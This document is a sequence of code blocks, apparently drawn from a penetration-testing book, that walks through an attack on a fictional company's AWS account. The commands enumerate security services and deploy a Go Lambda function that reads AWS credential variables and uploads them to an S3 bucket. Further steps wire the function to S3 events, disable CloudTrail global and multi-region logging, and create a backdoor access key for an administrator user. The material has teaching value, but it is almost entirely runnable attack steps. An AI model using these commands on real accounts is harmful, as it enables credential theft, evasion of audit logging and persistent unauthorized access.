["```\nroot@Point1:~/# **aws accessanalyzer list-analyzers --region=eu-west-1**\n{ \"analyzers\": [] }\n```", "```\n# Sample CloudTrail event creating an additional access key\n{\n    \"eventType\": \"AwsApiCall\",\n    \"userIdentity\": {\n        \"accessKeyId\": \"ASIA44ZRK6WS32PCYCHY\",\n        \"userName\": \"admin\"\n    },\n    \"eventTime\": \"2019-12-29T18:42:47Z\",\n    \"eventSource\": \"iam.amazonaws.com\",\n    \"eventName\": \"CreateAccessKey\",\n    \"awsRegion\": \"us-east-1\",\n    \"sourceIPAddress\": \"215.142.61.44\",\n    \"userAgent\": \"signin.amazonaws.com\",\n    \"requestParameters\": { \"userName\": \"admin\" },\n    \"responseElements\": {\n        \"accessKey\": {\n            \"accessKeyId\": \"AKIA44ZRK6WSRDLX7TDS\",\n \"status\": \"Active\",\n            \"userName\": \"admin\",\n            \"createDate\": \"Dec 29, 2019 6:42:47 PM\"\n}   }   }\n```", "```\nroot@Point1:~/# **aws cloudtrail describe-trails --region=eu-west-1**\n\"trailList\": [{\n   \"IncludeGlobalServiceEvents\": true,\n   \"Name\": \"Default\",\n   \"S3KeyPrefix\": \"region-all-logs\",\n   \"IsMultiRegionTrail\": true,\n 1\"HasInsightSelectors\": true,\n 2\"S3BucketName\": \"mxrads-cloudtrail-all\",\n   \"CloudWatchLogsLogGroupArn\": \"arn:aws:logs:eu-west-1:886371554408:\nlog-group:CloudTrail/Logs:*\",\n...}]\n```", "```\nroot@Point1:~/# **aws guardduty list-detectors --region=eu-west-1**\n{ \"DetectorIds\": [ \"64b5b4e50b86d0c7068a6537de5b770e\" ] }\n```", "```\nfunc main() {\n    lambda.Start(HandleRequest)\n}\n```", "```\nconst S3BUCKET=\"mxrads-analytics\"\nfunc HandleRequest(ctx context.Context, name MyEvent) (string, error) {\n    client := &http.Client{}\n    respURL := fmt.Sprintf(\"https://%s.s3.amazonaws.com/setup.txt\", S3BUCKET)\n```", "```\n accessKey := fmt.Sprintf(`\n        AWS_ACCESS_KEY_ID=%s\n        AWS_SECRET_ACCESS_KEY=%s\n        AWS_SESSION_TOKEN=%s\"`,\n            os.Getenv(\"AWS_ACCESS_KEY_ID\"),\n            os.Getenv(\"AWS_SECRET_ACCESS_KEY\"),\n            os.Getenv(\"AWS_SESSION_TOKEN\"),\n        )\n    uploadToS3(s3Client, S3BUCKET, \"lambda\", accessKey)\n```", "```\nroot@Point1:lambda/# **make**\nroot@Point1:lambda/# **zip function.zip function**\n```", "```\nroot@Point1:~/# **aws iam list-roles \\**\n**| jq -r '.Roles[] | .RoleName + \", \" + \\**\n**.AssumeRolePolicyDocument.Statement[].Principal.Service' \\**\n**| grep \"lambda.amazonaws.com\"**\n\ndynamo-access-mgmt, lambda.amazonaws.com\nchef-cleanup-ro, lambda.amazonaws.com\n`--snip--`\n```", "```\nroot@Point1:~/# **aws iam list-attached-role-policies --role dynamo-ssh-mgmt --profile jenkins**\n\n\"AttachedPolicies\": [\n     \"PolicyName\": IAMFullAccess\",\n     \"PolicyName\": cloudtrail-mgmt-rw\",\n     \"PolicyName\": dynamo-temp-rw\",\n`--snip--`\n```", "```\nroot@Point1:~/# **aws iam lambda list-functions â€“region=eu-west-1**\n\"FunctionName\": \"support-bbs-news\",\n\"FunctionName\": \"support-parse-logs\",\n\"FunctionName\": \"ssp-streaming-format\",\n`--snip--`\n```", "```\nroot@Point1:~/# **aws lambda create-function --function-name support-metrics-calc \\**\n**--zip-file fileb://function.zip \\**\n**--handler function \\**\n**--runtime go1.x \\**\n**--role arn:aws:iam::886371554408:role/dynamo-ssh-mgmt \\**\n**--region eu-west-1**\n```", "```\nroot@Point1:~/# **aws s3api list-objects-v2 --bucket s4d.mxrads.com > list_keys.txt**\n \"Key\": \"2aed773247f0211803d5e67b/82436/vid/720/6aa58ec9f77aca497f90c71c85ee.mp4\",\n \"LastModified\": \"2019-12-14T11:01:48.000Z\",\n`--snip--`\n\nroot@Point1:~/# **grep -c \"2020-12-14\" list_keys.txt**\n89\nroot@Point1:~/# **grep -c \"2020-12-13\"** **list_keys.txt**\n74\n`--snip--`\n```", "```\nroot@Point1:~/# **aws lambda add-permission \\**\n**--function-name support-metrics-calc \\**\n**--region eu-west-1 \\**\n**--statement-id s3InvokeLambda12 \\**\n**--action \"lambda:InvokeFunction\" \\**\n**--principal s3.amazonaws.com \\**\n**--source-arn arn:aws:s3:::s4d.mxrads.com \\**\n**--source-account 886371554408 \\**\n**--profile jenkins**\n```", "```\nroot@Point1:~/# **aws s3api put-bucket-notification-configuration \\**\n**--region eu-west-1 \\**\n**--bucket mxrads-mywebhook \\**\n**--profile jenkins \\**\n**--notification-configuration file://<(cat << EOF**\n**{**\n **\"LambdaFunctionConfigurations\": [{**\n **\"Id\": \"s3InvokeLambda12\",**\n **\"LambdaFunctionArn\": \"arn:aws:lambda:eu-west-1:886371554408**\n**:function:support-metrics-calc\",**\n **\"Events\": [\"s3:ObjectCreated:*\"],**\n **\"Filter\": {**\n **\"Key\": {**\n **\"FilterRules\": [{**\n **\"Name\": \"prefix\",**\n **\"Value\": \"2\"**\n **}]**\n **}**\n **}**\n **}]**\n**}**\n**EOF**\n**)**\n```", "```\nroot@Point1:~/# **curl https://mxrads-report-metrics.s3-eu-west-1.amazonaws.com/lambda**\n\nAWS_ACCESS_KEY_ID=ASIA44ZRK6WSTGTH5GLH\nAWS_SECRET_ACCESS_KEY=1vMoXxF9Tjf2OMnEMU...\nAWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEPT...\n\n# We load these ENV variables, then disable CloudTrail global and multiregion logging\nroot@Point1:~/# **aws cloudtrail update-trail \\**\n**--name default \\**\n**--no-include-global-service-events \\**\n**--no-is-multi-region \\**\n**--region=eu-west**\n\n\"Name\": \"default\",\n\"S3BucketName\": \"mxrads-cloudtrail-logs\",\n\"IncludeGlobalServiceEvents\": false,\n\"IsMultiRegionTrail\": false,\n`--snip--`\n```", "```\nroot@Point1:~/# **aws iam list-entities-for-policy \\**\n**--policy-arn arn:aws:iam::aws:policy/AdministratorAccess**\n\nUserName: b.daniella\nUserName: chris.hitch\nUserName: d.ressler\n`--snip--`\n```", "```\n# List access keys. If they have less than 2, there's room for another.\nroot@Point1:~/# **aws iam list-access-keys \\**\n**--user b.daniella \\**\n**| jq \".AccessKeyMetadata[].AccessKeyId\"**\n\n\"AKIA44ZRK6WS2XS5QQ4X\"\n```", "```\nroot@Point1:~/# **aws iam create-access-key --user b.daniella**\nUserName: b.daniella,\nAccessKeyId: AKIA44ZRK6WSY37NET32,\nSecretAccessKey: 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,\n```"]